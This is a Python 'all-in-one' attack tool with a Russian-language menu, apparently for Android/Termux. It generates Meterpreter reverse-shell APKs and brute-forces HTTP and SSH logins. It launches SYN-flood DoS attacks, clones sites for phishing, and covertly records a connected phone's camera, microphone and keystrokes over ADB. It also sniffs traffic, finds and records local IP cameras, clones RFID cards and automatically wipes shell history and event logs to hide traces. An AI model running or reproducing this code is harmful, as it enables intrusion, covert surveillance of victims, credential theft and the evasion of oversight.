#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 🔧 ALL-IN-ONE TOOL v5.0 — Мультитул для пентеста
# Termux / Windows / Linux
# 47+ функций | FFmpeg | Пошаговое меню | Сессии | Авточистка

import os, sys, json, time, subprocess, socket, random, shutil
from pathlib import Path
from datetime import datetime

DATA = "tool_data"
os.makedirs(DATA, exist_ok=True)
SESSIONS_FILE = f"{DATA}/sessions.json"
AUTO_CLEAN = True

# ==================== АВТО-ОЧИСТКА ====================
def auto_clean():
    if not AUTO_CLEAN: return
    if os.path.exists('/data/data/com.termux'):
        os.system('rm -rf /data/data/com.termux/files/home/.bash_history 2>/dev/null')
        os.system('history -c 2>/dev/null')
    for f in [f'{DATA}/sniffed.txt', f'{DATA}/dns.txt']:
        if os.path.exists(f) and os.path.getsize(f) > 1000000: os.remove(f)
    os.system('ip neigh flush all 2>/dev/null')
    os.system('arp -d * 2>nul')

def full_clean():
    print("🧹 ПОЛНАЯ ОЧИСТКА...")
    os.system('rm -rf /data/data/com.termux/files/home/.bash_history 2>/dev/null')
    os.system('rm -rf /data/data/com.termux/files/home/.zsh_history 2>/dev/null')
    os.system('rm -rf /data/data/com.termux/files/home/.python_history 2>/dev/null')
    os.system('history -c 2>/dev/null')
    os.system('ndc resolver clearnetdns 2>/dev/null')
    os.system('ipconfig /flushdns 2>nul')
    os.system('ip neigh flush all 2>/dev/null')
    os.system('arp -d * 2>nul')
    os.system(f'rm -rf {DATA}/*.tmp 2>/dev/null')
    os.system('rm -rf /data/data/com.termux/cache/* 2>/dev/null')
    os.system('termux-clipboard-set "" 2>/dev/null')
    print("✅ ВСЕ СЛЕДЫ ОЧИЩЕНЫ")

def stealth_mode():
    global AUTO_CLEAN
    AUTO_CLEAN = True
    print("🕵️ РЕЖИМ НЕВИДИМКИ АКТИВЕН")

def safe_run(func, *args, **kwargs):
    try: result = func(*args, **kwargs); auto_clean(); return result
    except Exception as e: auto_clean(); print(f"❌ {e}"); return None

# ==================== УСТАНОВКА ====================
def install_all():
    print("📦 УСТАНОВКА...")
    if sys.platform == 'win32':
        os.system('pip install requests pycryptodome python-nmap colorama psutil')
        return print("✅ Windows готов")
    os.system('pkg update -y && pkg upgrade -y')
    os.system('pkg install python nmap tcpdump ffmpeg termux-api git wget curl -y')
    os.system('pip install requests pycryptodome python-nmap colorama psutil')
    os.system('pkg install hydra aircrack-ng hashcat exiftool -y 2>/dev/null')
    print("✅ ГОТОВО!")

# ==================== СЕТЬ ====================
def scan_ports():
    target = input("🎯 Цель (IP или сеть): ").strip()
    os.system(f'nmap -T4 -F {target}')

def scan_deep():
    target = input("🎯 Цель: ").strip()
    os.system(f'nmap -T4 -A -O {target}')

def scan_wifi():
    print("📡 Сканирую Wi-Fi...")
    if sys.platform == 'win32': os.system('netsh wlan show networks')
    else: os.system('termux-wifi-scaninfo')

def arp_scan():
    print("📡 Устройства в сети:")
    os.system('arp -a')

def fake_ap():
    print("""
╔══════════════════════════════════════╗
║     📡 ФЕЙКОВАЯ ТОЧКА ДОСТУПА        ║
╚══════════════════════════════════════╝
""")
    if input("Продолжить? (да/нет): ").strip().lower() not in ['да','yes','y']:
        print("❌ Отмена"); return
    
    has_root = False
    if sys.platform != 'win32':
        has_root = 'uid=0' in os.popen('su -c id 2>/dev/null').read()
    
    ssid = input("📶 Название сети: ").strip() or "Free_WiFi"
    
    if has_root:
        print(f"✅ Root есть — запускаю автоматически...")
        os.system(f'su -c "cmd wifi start-softap {ssid} open"')
        print(f"✅ Точка '{ssid}' запущена!")
    else:
        print(f"""
📱 ВКЛЮЧИ ВРУЧНУЮ:
1. Настройки → Точка доступа Wi-Fi
2. Имя: {ssid}
3. Защита: Открытая
4. Включи
""")
        input("Нажми ENTER когда включишь...")

def sniff_http():
    print("👂 HTTP трафик... Ctrl+C стоп")
    os.system(f'tcpdump -i any -A "tcp port 80 or tcp port 8080" >> {DATA}/sniffed.txt 2>&1')

def sniff_dns():
    print("🌐 DNS запросы... Ctrl+C стоп")
    os.system(f'tcpdump -i any -A "port 53" >> {DATA}/dns.txt 2>&1')

def find_cameras():
    print("📷 Сканирую камеры...")
    base = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:3])
    cameras = []
    for port in [80,554,8080,8899,37777,8000,8554]:
        for i in range(1,255):
            ip = f"{base}.{i}"
            try:
                s = socket.socket(); s.settimeout(0.2)
                if s.connect_ex((ip,port)) == 0: print(f"  ✅ {ip}:{port}"); cameras.append({"ip":ip,"port":port})
                s.close()
            except: pass
    with open(f'{DATA}/cameras.json','w') as f: json.dump(cameras,f,indent=2)
    print(f"✅ Найдено: {len(cameras)}")

def view_cameras():
    if not os.path.exists(f'{DATA}/cameras.json'): print("❌ Сначала сканируй"); return
    with open(f'{DATA}/cameras.json') as f: cameras = json.load(f)
    for i,c in enumerate(cameras): print(f"  {i+1}. {c['ip']}:{c['port']}")
    try: num = int(input("\n🎥 Номер: ")) - 1; cam = cameras[num]
    except: print("❌"); return
    url = f"rtsp://{cam['ip']}:{cam['port']}/live" if cam['port'] in [554,8554] else f"http://{cam['ip']}:{cam['port']}/video"
    print(f"📹 Q — выход")
    os.system(f'ffplay -x 640 -y 480 -window_title "Камера {cam["ip"]}" "{url}" 2>/dev/null')

def save_stream():
    if not os.path.exists(f'{DATA}/cameras.json'): print("❌ Сначала сканируй"); return
    with open(f'{DATA}/cameras.json') as f: cameras = json.load(f)
    for i,c in enumerate(cameras): print(f"  {i+1}. {c['ip']}:{c['port']}")
    try: num = int(input("\n🎥 Номер: ")) - 1; cam = cameras[num]
    except: print("❌"); return
    output = f"{DATA}/record_{cam['ip'].replace('.','_')}_{int(time.time())}.mp4"
    url = f"rtsp://{cam['ip']}:{cam['port']}/live" if cam['port'] in [554,8554] else f"http://{cam['ip']}:{cam['port']}/video"
    print(f"📹 60 сек... Ctrl+C стоп")
    try: os.system(f'ffmpeg -i "{url}" -t 60 -c copy "{output}" 2>/dev/null'); print(f"✅ {output}")
    except KeyboardInterrupt: print(f"\n✅ {output}")

# ==================== ADB / СЕССИИ ====================
def load_sessions():
    if os.path.exists(SESSIONS_FILE):
        with open(SESSIONS_FILE,'r') as f: return json.load(f)
    return {}

def save_sessions(sessions):
    with open(SESSIONS_FILE,'w') as f: json.dump(sessions,f,indent=2)

def check_adb():
    result = os.popen('adb devices 2>/dev/null').read()
    lines = [l for l in result.split('\n') if l.strip() and 'List' not in l]
    if lines:
        for line in lines:
            if 'device' in line or 'unauthorized' in line:
                return line.split()[0], 'unauthorized' not in line
    return None, False

def wait_for_device():
    print("🔌 Жду USB... (подключи телефон + отладка USB)")
    for i in range(30,0,-1):
        serial, ok = check_adb()
        if serial:
            if ok:
                print(f"\n✅ Подключено: {serial}")
                return serial, True
            else:
                print(f"\n⚠️ Нажми 'ОК' на телефоне!")
                input("Нажми ENTER после разрешения...")
                serial, ok = check_adb()
                if ok: print(f"✅ Авторизовано: {serial}"); return serial, True
        print(f"\r   Ожидание... {i} сек", end='')
        time.sleep(1)
    print("\n❌ Не подключено")
    return None, False

def get_device_info(serial):
    info = {'serial': serial}
    for key, cmd in [('model','ro.product.model'),('brand','ro.product.manufacturer'),('android','ro.build.version.release')]:
        r = os.popen(f'adb -s {serial} shell getprop {cmd} 2>/dev/null').read().strip()
        info[key] = r or '?'
    info['root'] = 'uid=0' in os.popen(f'adb -s {serial} shell su -c id 2>/dev/null').read()
    try: info['battery'] = os.popen(f'adb -s {serial} shell dumpsys battery 2>/dev/null | grep level').read().split(':')[1].strip() + '%'
    except: info['battery'] = '?'
    return info

def device_menu(serial):
    info = get_device_info(serial)
    while True:
        print(f"""
╔══════════════════════════════════════╗
║  📱 {info['brand']} {info['model']} | Android {info['android']}
║  🔋 {info['battery']} | Root: {'✅' if info['root'] else '❌'}
╠══════════════════════════════════════╣
║  1.📸 Скриншот    2.🎥 Запись экрана║
║  3.📁 Извлечь фото 4.📦 Установить APK║
║  5.📷 Камера(r)   6.🎤 Микрофон(r)  ║
║  7.⌨️ Кейлогер(r)  8.ℹ️ Инфо         ║
║  9.📋 Приложения                     ║
╠══════════════════════════════════════╣
║  10.💾 Сохранить сессию              ║
║  0. Отключиться                      ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1':
            os.system(f'adb -s {serial} exec-out screencap -p > {DATA}/screen_{int(time.time())}.png')
            print("✅ Готово")
        elif c == '2':
            os.system(f'adb -s {serial} shell screenrecord /sdcard/screen.mp4 --time-limit 30')
            os.system(f'adb -s {serial} pull /sdcard/screen.mp4 {DATA}/screen_{int(time.time())}.mp4')
            print("✅ Готово")
        elif c == '3':
            folder = f"{DATA}/extracted_{serial}"; os.makedirs(folder, exist_ok=True)
            for d in ['DCIM','Download','Pictures']:
                os.system(f'adb -s {serial} pull /sdcard/{d} {folder}/ 2>/dev/null')
            print(f"✅ {folder}")
        elif c == '4':
            apk = input("📦 APK: ").strip()
            if os.path.exists(apk): os.system(f'adb -s {serial} install {apk}'); print("✅")
            else: print("❌ Не найден")
        elif c == '5':
            if info['root']: os.system(f'adb -s {serial} shell su -c "am start -n com.android.camera/.Camera --ez extra_hide_ui true" 2>/dev/null'); print("✅")
            else: print("❌ Нужен root")
        elif c == '6':
            if info['root']:
                os.system(f'adb -s {serial} shell su -c "arecord -d 30 /sdcard/audio.wav" 2>/dev/null')
                os.system(f'adb -s {serial} pull /sdcard/audio.wav {DATA}/audio_{int(time.time())}.wav')
                print(f"✅ {DATA}/")
            else: print("❌ Нужен root")
        elif c == '7':
            if info['root']:
                os.system(f'adb -s {serial} shell su -c "getevent -lt /dev/input/event0" > {DATA}/keys_{int(time.time())}.txt 2>&1 &')
                time.sleep(30); os.system(f'adb -s {serial} shell su -c "killall getevent" 2>/dev/null')
                print(f"✅ {DATA}/")
            else: print("❌ Нужен root")
        elif c == '8':
            for k,v in info.items(): print(f"  {k}: {v}")
        elif c == '9':
            os.system(f'adb -s {serial} shell pm list packages 2>/dev/null | head -30')
        elif c == '10':
            name = input("💾 Имя сессии: ").strip() or f"{info['brand']}_{info['model']}"
            sessions = load_sessions()
            sessions[name] = {'serial':serial,'model':info['model'],'brand':info['brand'],'android':info['android'],'root':info['root'],'saved':datetime.now().isoformat(),'ip':input("📡 IP телефона: ").strip()}
            save_sessions(sessions)
            os.system(f'adb -s {serial} tcpip 5555 2>/dev/null')
            print(f"✅ '{name}' сохранена! Можно отключать USB.")

def connect_session():
    sessions = load_sessions()
    if not sessions: print("❌ Нет сессий"); return None
    print("\n💾 СЕССИИ:")
    names = list(sessions.keys())
    for i,n in enumerate(names):
        s = sessions[n]; print(f"  {i+1}. {n} — {s.get('brand','?')} {s.get('model','?')}")
    try:
        num = int(input("\n📱 Номер (0-отмена): ")) - 1
        if num < 0: return None
        name = names[num]; s = sessions[name]
    except: print("❌"); return None
    if s.get('ip'):
        print(f"📡 Подключаюсь к {s['ip']}...")
        os.system(f'adb connect {s["ip"]}:5555 2>/dev/null'); time.sleep(2)
    serial, ok = check_adb()
    if serial: print(f"✅ Подключено!"); return serial
    print("⚠️ Не удалось. Подключи USB.")
    input("Нажми ENTER...")
    serial, ok = wait_for_device()
    return serial

# ==================== ВЗЛОМ ====================
def bruteforce_http():
    target = input("🎯 IP:порт: ").strip(); user = input("👤 Логин: ").strip() or "admin"
    wordlist = input("📚 Словарь: ").strip() or f"{DATA}/passwords.txt"
    if not os.path.exists(wordlist):
        with open(wordlist,'w') as f:
            for p in ['admin','12345','password','admin123','root','guest','0000']: f.write(p+'\n')
    print(f"🔓 {target}...")
    try:
        import requests
        with open(wordlist) as f:
            for pwd in f:
                pwd = pwd.strip()
                try:
                    r = requests.get(f'http://{target}',auth=(user,pwd),timeout=3)
                    if r.status_code == 200: print(f"  ✅ {user}:{pwd}"); return
                except: pass
    except: pass
    print("  ❌")

def bruteforce_ssh():
    target = input("🎯 SSH: ").strip(); user = input("👤: ").strip() or "root"
    w = input("📚 Словарь: ").strip() or f"{DATA}/passwords.txt"
    if not os.path.exists(w):
        with open(w,'w') as f:
            for p in ['root','admin','password','123456','toor']: f.write(p+'\n')
    os.system(f'hydra -l {user} -P {w} ssh://{target}')

def hash_crack():
    os.system(f'hashcat -m 0 {input("📄 Хеш: ").strip()} {input("📚 Словарь: ").strip()}')

def search_cve():
    os.system(f'searchsploit {input("🔍 Софт: ").strip()}')

def ddos():
    os.system(f'hping3 -S --flood -V {input("🎯 IP:порт: ").strip()}')

def gen_payload():
    lh = input("📡 Твой IP: ").strip(); lp = input("🔌 Порт: ").strip() or "4444"
    out = input("📄 Файл: ").strip() or f"{DATA}/payload.apk"
    os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -o {out}')
    print(f"✅ {out}")

def phishing_page():
    s = input("🌐 Сайт: ").strip() or "vk.com"
    os.system(f'wget -r -l1 -p -np -k {s} 2>/dev/null')
    print(f"✅ {s}/")

# ==================== ЗАЩИТА ====================
def clear_logs():
    if sys.platform == 'win32': os.system('wevtutil cl System 2>nul & wevtutil cl Security 2>nul')
    else: os.system('rm -rf /data/data/com.termux/files/home/.bash_history')
    print("✅")

def change_mac():
    m = ':'.join(['%02x'%random.randint(0,255) for _ in range(6)])
    print(f"🔄 {m}")
    if sys.platform == 'win32': os.system(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\0001" /v NetworkAddress /d {m.replace(":","")} /f')
    else: os.system(f'su -c "ip link set wlan0 address {m}"')

def check_root():
    if sys.platform == 'win32': print("✅ Админ")
    else: print(f"{'✅ Root' if 'uid=0' in os.popen('su -c id 2>/dev/null').read() else '❌ Нет root'}")

def tor_start():
    print("🧅 Tor..."); os.system('tor &'); time.sleep(3); print("✅ 127.0.0.1:9050")

def vpn_check():
    print("🌍 Мой IP:"); os.system('curl -s ifconfig.me 2>/dev/null'); print()

# ==================== RFID/NFC ====================
def rfid_clone():
    print("📡 1.Считать 2.Эмулировать 3.Записать 4.NFC телефон")
    c = input('>>> ').strip()
    if c == '1': os.system('pm3 -c "lf search"')
    elif c == '2':
        card_id = input("ID: ").strip()
        os.system(f'pm3 -c "lf em 410x emu --id {card_id}"')
    elif c == '3':
        card_id = input("ID: ").strip()
        os.system(f'pm3 -c "lf em 410x clone --id {card_id}"')
    elif c == '4': os.system('nfc-list')

def rfid_phone():
    print("📱 Поднеси карту..."); r = os.popen('nfc-list 2>/dev/null').read()
    if r: print(f"📋 {r}"); open(f'{DATA}/rfid.txt','a').write(f"{datetime.now()}: {r}\n")

# ==================== OSINT ====================
def osint_search():
    print("🔍 1.Телефон 2.Email 3.Ник 4.IP 5.Утечки 6.Соцсети")
    c = input('>>> ').strip()
    if c == '1':
        phone = input("📱 +79: ").strip()
        os.system(f'curl -s "https://htmlweb.ru/geo/api.php?json&telcod={phone}" 2>/dev/null')
    elif c == '2':
        email = input("📧: ").strip()
        os.system(f'curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/{email}" 2>/dev/null')
    elif c == '3':
        u = input("👤: ").strip()
        for s in ['github.com','vk.com','t.me']:
            print(f"  {s}/{u}: ", end='')
            os.system(f'curl -s -o /dev/null -w "%{{http_code}}" https://{s}/{u} 2>/dev/null')
            print()
    elif c == '4':
        ip = input("IP: ").strip()
        os.system(f'curl -s "http://ip-api.com/json/{ip}" 2>/dev/null')
    elif c == '5':
        email = input("📧: ").strip()
        os.system(f'curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/{email}" 2>/dev/null')
    elif c == '6':
        name = input("👤 Имя: ").strip()
        print(f"  VK: https://vk.com/search?q={name}")

def osint_photo():
    print("📷 https://images.google.com\n  https://tineye.com\n  https://yandex.ru/images/search")

# ==================== АВТО-АТАКИ ====================
def auto_attack():
    print("⚡ АВТО-АТАКА...")
    base = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:3])
    devices = []
    for i in range(1,255):
        ip = f"{base}.{i}"
        try:
            s = socket.socket(); s.settimeout(0.1)
            if s.connect_ex((ip,80)) == 0:
                try: host = socket.gethostbyaddr(ip)[0]
                except: host = "?"
                print(f"  ✅ {ip} — {host}"); devices.append({"ip":ip,"host":host})
            s.close()
        except: pass
    report = f"{DATA}/auto_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report,'w') as f: json.dump({"devices":devices},f,indent=2)
    print(f"✅ {len(devices)} | 📄 {report}")

def auto_monitor():
    print("👁️ Мониторинг... Ctrl+C стоп"); known = set()
    try:
        while True:
            base = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:3]); curr = set()
            for i in range(1,255):
                try:
                    s = socket.socket(); s.settimeout(0.05)
                    if s.connect_ex((f"{base}.{i}",80)) == 0: curr.add(f"{base}.{i}")
                    s.close()
                except: pass
            new = curr - known
            if new:
                for ip in new: print(f"  🆕 {ip}")
            known = curr; time.sleep(10)
    except KeyboardInterrupt: print("\n⏹️ Стоп")

# ==================== ДАННЫЕ ====================
def recover_files():
    path = input("📁 Путь: ").strip(); ext = input("📝 Расширение: ").strip()
    for root, dirs, files in os.walk(path):
        for f in files:
            if f.endswith(ext): print(f"  📄 {os.path.join(root, f)}")

def encrypt_file():
    fname = input("📄 Файл: ").strip(); key = input("🔑 Пароль: ").strip()
    try:
        from Crypto.Cipher import AES
        with open(fname,'rb') as f: data = f.read()
        cipher = AES.new(key.ljust(16)[:16].encode(), AES.MODE_EAX)
        ct, tag = cipher.encrypt_and_digest(data)
        with open(fname+'.enc','wb') as f: [f.write(x) for x in (cipher.nonce,tag,ct)]
        print(f"✅ {fname}.enc")
    except Exception as e: print(f"❌ {e}")

def decrypt_file():
    fname = input("📄 .enc: ").strip(); key = input("🔑 Пароль: ").strip()
    try:
        from Crypto.Cipher import AES
        with open(fname,'rb') as f: nonce,tag,ct = [f.read(x) for x in (16,16,-1)]
        cipher = AES.new(key.ljust(16)[:16].encode(), AES.MODE_EAX, nonce=nonce)
        data = cipher.decrypt_and_verify(ct,tag)
        out = fname.replace('.enc','.dec')
        with open(out,'wb') as f: f.write(data)
        print(f"✅ {out}")
    except Exception as e: print(f"❌ {e}")

def metadata():
    photo = input("📷 Фото: ").strip()
    if os.path.exists(photo): os.system(f'exiftool "{photo}"')
    else: print("❌ Не найден")

def stego_hide():
    img = input("📷 Картинка: ").strip(); text = input("📝 Текст: ").strip()
    out = input("📄 Выход: ").strip() or "secret.png"
    os.system(f'steghide embed -cf {img} -ef - -p "" -sf {out} <<< "{text}"')
    print(f"✅ {out}")

def stego_extract():
    os.system(f'steghide extract -sf {input("📷 Картинка: ").strip()}')

def hidden_folder():
    path = f"{DATA}/{input('📁 Имя: ').strip() or '.hidden'}"
    os.makedirs(path, exist_ok=True)
    if sys.platform == 'win32': os.system(f'attrib +h "{path}"')
    print(f"✅ {path}")

# ==================== СЕРВИСЫ ====================
def whois_lookup():
    os.system(f'whois {input("🌐 Домен: ").strip()}')

def ngrok_start():
    os.system(f'ngrok http {input("🔌 Порт: ").strip() or "8888"}')

# ==================== БОНУС ====================
def self_destruct():
    print("💀 3 сек..."); time.sleep(3)
    shutil.rmtree(DATA, ignore_errors=True)
    try: os.remove(__file__)
    except: pass
    print("💀 Готово")

# ==================== МЕНЮ ====================
def menu_network():
    while True:
        print("""
╔══════════════════════════════════════╗
║            📡 СЕТЬ                   ║
╠══════════════════════════════════════╣
║  1.Скан портов│2.Глубокий скан       ║
║  3.Wi-Fi сети │4.ARP устройства      ║
║  5.Фейк точка │6.HTTP сниффер        ║
║  7.DNS сниффер│8.Найти камеры        ║
║  9.Смотреть   │10.Записать видео     ║
║  0.Назад                             ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(scan_ports)
        elif c == '2': safe_run(scan_deep)
        elif c == '3': safe_run(scan_wifi)
        elif c == '4': safe_run(arp_scan)
        elif c == '5': safe_run(fake_ap)
        elif c == '6': safe_run(sniff_http)
        elif c == '7': safe_run(sniff_dns)
        elif c == '8': safe_run(find_cameras)
        elif c == '9': safe_run(view_cameras)
        elif c == '10': safe_run(save_stream)

def menu_devices():
    while True:
        print("""
╔══════════════════════════════════════╗
║            📱 УСТРОЙСТВА             ║
╠══════════════════════════════════════╣
║  1.🔌 Подключить новое               ║
║  2.💾 Загрузить сессию               ║
║  3.📋 Все сессии                     ║
║  4.🗑️ Удалить сессию                 ║
║  0.Назад                             ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1':
            serial, ok = wait_for_device()
            if serial and ok: time.sleep(2); device_menu(serial)
        elif c == '2':
            serial = connect_session()
            if serial: device_menu(serial)
        elif c == '3':
            sessions = load_sessions()
            if sessions:
                for n,s in sessions.items(): print(f"  📱 {n} — {s.get('brand','?')} {s.get('model','?')}")
            else: print("❌ Нет")
        elif c == '4':
            sessions = load_sessions()
            if sessions:
                names = list(sessions.keys())
                for i,n in enumerate(names): print(f"  {i+1}. {n}")
                try:
                    num = int(input("🗑️ Номер: ")) - 1
                    if num >= 0: del sessions[names[num]]; save_sessions(sessions); print("✅")
                except: pass

def menu_attack():
    while True:
        print("""
╔══════════════════════════════════════╗
║            🔓 ВЗЛОМ                  ║
╠══════════════════════════════════════╣
║  1.Брут HTTP  │2.Брут SSH            ║
║  3.Хеш        │4.CVE                 ║
║  5.DDoS       │6.Payload             ║
║  7.Фишинг     │0.Назад               ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(bruteforce_http)
        elif c == '2': safe_run(bruteforce_ssh)
        elif c == '3': safe_run(hash_crack)
        elif c == '4': safe_run(search_cve)
        elif c == '5': safe_run(ddos)
        elif c == '6': safe_run(gen_payload)
        elif c == '7': safe_run(phishing_page)

def menu_defense():
    while True:
        print("""
╔══════════════════════════════════════╗
║            🛡️ ЗАЩИТА                 ║
╠══════════════════════════════════════╣
║  1.Чистка     │2.Смена MAC           ║
║  3.Проверка   │4.Tor                 ║
║  5.Мой IP     │6.Полная чистка       ║
║  7.Невидимка  │0.Назад               ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(clear_logs)
        elif c == '2': safe_run(change_mac)
        elif c == '3': safe_run(check_root)
        elif c == '4': safe_run(tor_start)
        elif c == '5': safe_run(vpn_check)
        elif c == '6': safe_run(full_clean)
        elif c == '7': safe_run(stealth_mode)

def menu_rfid():
    while True:
        print("""
╔══════════════════════════════════════╗
║            📡 RFID/NFC               ║
╠══════════════════════════════════════╣
║  1.Клон RFID  │2.Чтение телефоном    ║
║  0.Назад                             ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(rfid_clone)
        elif c == '2': safe_run(rfid_phone)

def menu_osint():
    while True:
        print("""
╔══════════════════════════════════════╗
║            🔍 OSINT                  ║
╠══════════════════════════════════════╣
║  1.Поиск инфо │2.Поиск по фото       ║
║  0.Назад                             ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(osint_search)
        elif c == '2': safe_run(osint_photo)

def menu_auto():
    while True:
        print("""
╔══════════════════════════════════════╗
║            ⚡ АВТО                   ║
╠══════════════════════════════════════╣
║  1.Авто-атака │2.Мониторинг          ║
║  0.Назад                             ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(auto_attack)
        elif c == '2': safe_run(auto_monitor)

def menu_data():
    while True:
        print("""
╔══════════════════════════════════════╗
║            💾 ДАННЫЕ                 ║
╠══════════════════════════════════════╣
║  1.Восстан.   │2.Шифрование          ║
║  3.Дешифровка │4.Метаданные          ║
║  5.Стего hide │6.Стего extract       ║
║  7.Скрытая    │0.Назад               ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(recover_files)
        elif c == '2': safe_run(encrypt_file)
        elif c == '3': safe_run(decrypt_file)
        elif c == '4': safe_run(metadata)
        elif c == '5': safe_run(stego_hide)
        elif c == '6': safe_run(stego_extract)
        elif c == '7': safe_run(hidden_folder)

def menu_services():
    while True:
        print("""
╔══════════════════════════════════════╗
║            🌐 СЕРВИСЫ                ║
╠══════════════════════════════════════╣
║  1.WHOIS      │2.Ngrok               ║
║  0.Назад                             ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': safe_run(whois_lookup)
        elif c == '2': safe_run(ngrok_start)

def main():
    print("""
╔══════════════════════════════════════╗
║  🔧 ALL-IN-ONE TOOL v5.0             ║
╚══════════════════════════════════════╝
""")
    while True:
        print("""
╔══════════════════════════════════════╗
║         📋 ГЛАВНОЕ МЕНЮ              ║
╠══════════════════════════════════════╣
║  1.📡 СЕТЬ      2.📱 УСТРОЙСТВА     ║
║  3.🔓 ВЗЛОМ     4.🛡️ ЗАЩИТА         ║
║  5.📡 RFID/NFC  6.🔍 OSINT          ║
║  7.⚡ АВТО      8.💾 ДАННЫЕ         ║
║  9.🌐 СЕРВИСЫ                        ║
╠══════════════════════════════════════╣
║  98.Установка  99.САМОУНИЧТОЖЕНИЕ    ║
║  0.Выход                             ║
╚══════════════════════════════════════╝
""")
        c = input('>>> ').strip()
        if c == '0': break
        elif c == '1': menu_network()
        elif c == '2': menu_devices()
        elif c == '3': menu_attack()
        elif c == '4': menu_defense()
        elif c == '5': menu_rfid()
        elif c == '6': menu_osint()
        elif c == '7': menu_auto()
        elif c == '8': menu_data()
        elif c == '9': menu_services()
        elif c == '98': safe_run(install_all)
        elif c == '99': safe_run(self_destruct)

if __name__ == '__main__':
    stealth_mode()
    try: main()
    except KeyboardInterrupt: print("\n👋 Выход")
    finally: auto_clean(); print("🧹 Следы очищены")
